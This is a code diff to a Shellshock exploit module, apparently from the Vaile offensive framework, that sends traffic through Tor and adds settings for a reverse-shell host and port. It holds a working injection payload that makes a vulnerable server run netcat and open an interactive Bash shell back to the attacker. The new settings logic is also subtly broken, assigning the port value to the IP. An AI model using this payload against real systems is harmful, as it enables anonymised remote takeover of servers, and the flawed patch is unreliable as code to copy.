@@ -10,7 +10,7 @@
 #https://github.com/VainlyStrain/Vaile
 
 
-import requests
+from core.methods.tor import session
 import time
 from random import *
 import string
@@ -19,10 +19,10 @@ from core.Core.colors import *
 
 info = "Shellshock Exploit."
 searchinfo = "Shellshock Exploit"
-properties = {}
+properties = {"SHELL-IP":["IP for the reverse shell to connect to", " "], "SHELL-PORT":["Port for the reverse shell to connect to", " "]}
 
 def shellshock0x00(web):
-
+    requests = session()
     print(GR+' [*] Parsing strings...')
     time.sleep(0.5)
     r_str = ''.join(Random().sample(string.ascii_letters, 30))
@@ -52,8 +52,14 @@ def shellshock0x00(web):
                 print(GR+' [*] Preparing for the exploitation phase...')
                 time.sleep(0.4)
                 print(GR+' [*] Configuring payload...')
-                ip = input(O+' [#] Enter reverse IP :> ')
-                port = input(' [#] Enter port :> ')
+                if properties["SHELL-IP"][1] == " ":
+                    ip = input(O+' [#] Enter reverse IP :> ')
+                else:
+                    ip = properties["SHELL-PORT"][1]
+                if properties["SHELL-IP"][1] == " ":
+                    port = input(' [#] Enter port :> ')
+                else:
+                    port = properties["SHELL-PORT"][1]
                 exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
                 time.sleep(0.7)
                 print(C+' [!] Using payload : '+B+exp)
